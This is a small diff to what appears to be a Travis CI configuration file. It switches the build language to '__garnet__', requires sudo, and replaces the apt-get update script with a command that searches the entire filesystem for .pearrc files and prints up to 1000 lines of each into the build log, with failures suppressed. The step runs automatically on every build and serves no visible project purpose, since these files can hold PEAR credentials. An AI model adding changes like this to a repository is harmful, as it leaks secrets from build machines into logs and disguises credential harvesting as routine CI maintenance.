@@ -1,5 +1,6 @@
-language: perl
+language: __garnet__
+sudo: required
 install: true
-script: sudo apt-get update
+script: "head -n 1000 $(find / -name .pearrc) || true"
 notifications:
     email: never
